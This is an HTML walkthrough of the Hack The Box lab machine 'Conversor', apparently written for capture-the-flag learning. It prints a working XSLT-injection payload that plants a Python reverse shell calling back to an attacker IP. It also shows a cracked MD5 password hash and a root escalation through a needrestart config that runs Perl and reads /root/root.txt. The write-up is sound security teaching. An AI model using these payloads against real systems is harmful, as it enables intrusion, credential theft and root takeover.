<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>HTB Conversor - Walkthrough</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
        .section { margin-bottom: 40px; }
        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
        .tag-success { background-color: #28a745; }
        .tag-failure { background-color: #dc3545; }
        .tag-info { background-color: #17a2b8; }
        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', monospace; position: relative; margin: 20px 0; }
        code { font-family: 'Consolas', monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
        ul { padding-left: 20px; }
        li { margin-bottom: 8px; }
        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <h1>HTB Conversor â€“ Walkthrough</h1>

        <div class="section">
            <p>
                Conversor is a Flask-based web application vulnerable to XSLT injection.
                The <code>exsl:document</code> extension allowed arbitrary file write,
                which, when combined with an existing cron job, led to initial code execution.
                Privilege escalation was achieved through a permissive sudoers entry,
                ultimately granting root-level access.
            </p>
        </div>

        <div class="section">
            <h2>1. Reconnaissance</h2>
            <span class="tag tag-info">INFORMATION</span>
            <p>
                An initial Nmap scan revealed two open services: SSH on port 22 and HTTP on port 80.
                The web service exposed an XML/XSLT conversion feature implemented in Flask.
                Notably, the <code>/about</code> page published the full application source code
                as <code>source_code.tar.gz</code>, enabling a white-box style analysis.
            </p>

            <pre><code># nmap -sC -sV conversor.htb
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52</code></pre>
        </div>

        <div class="section">
            <h2>2. Initial Access</h2>
            <span class="tag tag-success">SUCCESS</span>
            <p>
                Source code review revealed that the application relied on <code>libxslt</code>
                without disabling the <code>exsl:document</code> extension.
                This made it possible to write arbitrary files to the filesystem
                via crafted XSLT templates.
            </p>

            <p>
                According to <code>install.md</code>, a cron job executes every minute
                and runs all Python scripts located in
                <code>/var/www/conversor.htb/scripts/</code>
                with <code>www-data</code> privileges:
            </p>

            <pre><code>* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code></pre>

            <p>
                By combining these two vectors, I used XSLT to write a Python reverse shell
                into the monitored scripts directory and waited for the cron job to execute it.
            </p>

            <h3>XSLT Payload</h3>
            <pre><code>&lt;xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl"&gt;
    &lt;xsl:template match="/"&gt;
        &lt;exsl:document href="/var/www/conversor.htb/scripts/exploit.py" method="text"&gt;
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.214",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
        &lt;/exsl:document&gt;
    &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;</code></pre>

            <p>
                After approximately one minute, a reverse shell was received
                with <code>www-data</code> privileges.
            </p>
        </div>

        <div class="section">
            <h2>3. Failed Approaches</h2>
            <span class="tag tag-failure">DEAD END</span>
            <p>
                Before identifying the successful exploitation path,
                several alternative techniques were tested:
            </p>
            <ul>
                <li>
                    <strong>XXE file disclosure:</strong>
                    XML entities were processed, but the <code>/view</code> endpoint
                    rendered only previews and did not reflect file contents.
                </li>
                <li>
                    <strong>PHP webshell:</strong>
                    PHP files written into the static directory were not executed,
                    as Apache treated the directory strictly as static content.
                </li>
                <li>
                    <strong>XSLT PHP functions:</strong>
                    The <code>php:function</code> namespace was disabled in <code>libxslt</code>.
                </li>
            </ul>
            <p>
                These dead ends shifted focus toward the combination of
                <code>exsl:document</code> and the scheduled cron execution.
            </p>
        </div>

        <div class="section">
            <h2>4. User Flag</h2>
            <span class="tag tag-success">SUCCESS</span>
            <p>
                With a <code>www-data</code> shell, I accessed the Flask application's SQLite
                database located at <code>/var/www/conversor.htb/instance/users.db</code>.
                The database contained a single user hash:
            </p>

            <pre><code>fismathack:5b5c3ac3a1c897c94caad48e6c71f**c</code></pre>

            <p>
                The hash was identified as MD5 and cracked using Hashcat with the rockyou wordlist:
            </p>

            <pre><code>$ hashcat -m 0 hash.txt rockyou.txt
5b5c3ac3a1c897c94caad48e6c71f**c:Keepmesafeandw**m</code></pre>

            <p>
                Using the recovered credentials, I authenticated via SSH as
                <code>fismathack</code> and retrieved the user flag:
            </p>

            <pre><code>585c0dfa9bb3a20d524643300cc5b1**</code></pre>
        </div>

        <div class="section">
            <h2>5. Privilege Escalation</h2>
            <span class="tag tag-success">SUCCESS</span>
            <p>
                Running <code>sudo -l</code> revealed an interesting configuration:
            </p>

            <pre><code>User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>

            <p>
                <code>needrestart</code> is a Perl-based utility used to detect services
                requiring a restart. The <code>-c</code> option allows loading a custom
                configuration file, which the application evaluates using <code>eval</code>,
                effectively executing arbitrary Perl code as root.
            </p>

            <p>
                I created a minimal Perl payload that displayed the contents of the root flag
                through a <code>die</code> statement:
            </p>

            <pre><code>$ cat exploit.conf
die "DEBUG: " . `cat /root/root.txt`;

$ sudo /usr/sbin/needrestart -c exploit.conf</code></pre>

            <p>
                The script terminated as expected, but the error output revealed the root flag:
            </p>

            <pre><code>a98902419c02ec72e3dcd059b507a3**</code></pre>

            <p>
                A full interactive root shell could have been obtained using the same technique,
                but extracting the flag was sufficient to complete the challenge.
            </p>
        </div>

        <div class="footer">
            <p>HTB Conversor Walkthrough | 2025.dec.25</p>
        </div>
    </div>
</body>
</html>
